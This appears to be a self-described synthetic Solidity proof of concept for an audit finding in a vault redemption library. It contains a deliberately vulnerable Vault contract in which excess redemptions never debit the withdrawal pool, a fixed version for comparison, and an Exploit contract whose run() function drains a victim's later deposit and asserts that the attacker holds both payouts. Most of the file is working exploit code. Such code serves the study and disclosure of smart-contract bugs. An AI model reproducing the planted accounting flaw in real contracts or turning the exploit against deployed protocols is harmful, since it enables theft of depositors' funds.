// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Cork — VaultPoolLib.redeem pays a partial redemption without decreasing
    withdrawalPool.raBalance / paBalance (Sherlock #144, finding 41480).
    SYNTHETIC, cheatcode-free. The next issuance's reserve() still counts the
    withdrawn balance, so the same RA is paid again out of the new deposit.
    @> VULN marks the excess payout that never debits the withdrawal pool. */

contract ERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "allow");
            allowance[from][msg.sender] = allowed - amount;
        }
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

struct WithdrawalPool {
    uint256 raBalance;
    uint256 paBalance;
    uint256 raExchangeRate;
    uint256 paExchangeRate;
}

contract Vault {
    ERC20 public ra;
    WithdrawalPool public withdrawalPool;
    uint256 public userEligible;
    uint256 public phantomClaim;

    constructor(ERC20 ra_) {
        ra = ra_;
        withdrawalPool.raBalance = 1000 ether;
        withdrawalPool.paBalance = 1000 ether;
        withdrawalPool.raExchangeRate = 1e18;
        withdrawalPool.paExchangeRate = 1e18;
        userEligible = 400 ether;
    }

    function __tryRedeemfromWithdrawalPool(uint256 amountAttributed)
        internal
        view
        returns (uint256 raAmt, uint256 paAmt)
    {
        raAmt = (amountAttributed * withdrawalPool.raExchangeRate) / 1e18;
        paAmt = (amountAttributed * withdrawalPool.paExchangeRate) / 1e18;
    }

    /// Quoted shape of VaultPoolLib.__tryRedeemExcessFromAmmPool. The inner
    /// redeem is the view helper, so the withdrawal-pool balances stay put.
    function __tryRedeemExcessFromAmmPool(uint256 amountAttributed, uint256 excessAmount)
        internal
        view
        returns (uint256 raOut, uint256 paOut, uint256 withdrawnFromAmm)
    {
        (raOut, paOut) = __tryRedeemfromWithdrawalPool(amountAttributed);
        withdrawnFromAmm = (excessAmount * withdrawalPool.raExchangeRate) / 1e18; // @> VULN: excess RA is paid while raBalance and paBalance are not decreased
        raOut += withdrawnFromAmm;
    }

    function redeemExpired(uint256 amount) external returns (uint256 paid) {
        uint256 eligible = userEligible;
        require(amount > eligible, "need excess path");
        uint256 excessAmount = amount - eligible;
        (uint256 raOut,,) = __tryRedeemExcessFromAmmPool(eligible, excessAmount);
        paid = raOut;
        ra.transfer(msg.sender, paid);
        userEligible = 0;
    }

    function depositNewIssuance(uint256 amount) external {
        ra.transferFrom(msg.sender, address(this), amount);
        reserve();
    }

    function reserve() public {
        uint256 counted = withdrawalPool.raBalance;
        phantomClaim = counted;
    }

    function redeemStale() external returns (uint256 paid) {
        paid = phantomClaim;
        uint256 bal = ra.balanceOf(address(this));
        if (paid > bal) paid = bal;
        require(paid > 0, "nothing stale");
        ra.transfer(msg.sender, paid);
        phantomClaim = 0;
    }
}

contract VaultFixed {
    ERC20 public ra;
    WithdrawalPool public withdrawalPool;
    uint256 public userEligible;

    constructor(ERC20 ra_) {
        ra = ra_;
        withdrawalPool.raBalance = 1000 ether;
        withdrawalPool.paBalance = 1000 ether;
        withdrawalPool.raExchangeRate = 1e18;
        withdrawalPool.paExchangeRate = 1e18;
        userEligible = 400 ether;
    }

    function redeemExpired(uint256 amount) external returns (uint256 paid) {
        uint256 eligible = userEligible;
        require(amount > eligible, "need excess path");
        uint256 raOut = (eligible * withdrawalPool.raExchangeRate) / 1e18;
        withdrawalPool.raBalance -= raOut;
        withdrawalPool.paBalance -= (eligible * withdrawalPool.paExchangeRate) / 1e18;
        paid = raOut;
        ra.transfer(msg.sender, paid);
        userEligible = 0;
    }
}

contract Victim {
    function deposit(ERC20 ra, Vault vault, uint256 amount) external {
        ra.approve(address(vault), amount);
        vault.depositNewIssuance(amount);
    }
}

contract Exploit {
    ERC20 public ra; // nonce 1
    Vault public vault; // nonce 2
    Victim public victim; // nonce 3

    constructor() {
        ra = new ERC20("Reserve Asset", "RA");
        vault = new Vault(ra);
        victim = new Victim();
        ra.mint(address(vault), 1000 ether);
        ra.mint(address(victim), 1000 ether);
    }

    function run() external {
        uint256 eligible = vault.userEligible();
        require(eligible == 400 ether, "partial redemption request");
        uint256 first = vault.redeemExpired(1000 ether);
        require(first == 1000 ether, "first redeem paid the whole pool");
        (uint256 raBal, uint256 paBal,,) = vault.withdrawalPool();
        require(raBal == 1000 ether && paBal == 1000 ether, "pool balances stayed stale");
        victim.deposit(ra, vault, 1000 ether);
        uint256 phantom = vault.phantomClaim();
        require(phantom == 1000 ether, "reserve counted the withdrawn balance");
        uint256 second = vault.redeemStale();
        require(second == 1000 ether, "second redeem took the new deposit");
        require(ra.balanceOf(address(this)) == 2000 ether, "attacker holds both pulls");
        require(ra.balanceOf(address(victim)) == 0, "victim deposit is gone");
        require(ra.balanceOf(address(vault)) == 0, "vault is empty");
    }
}
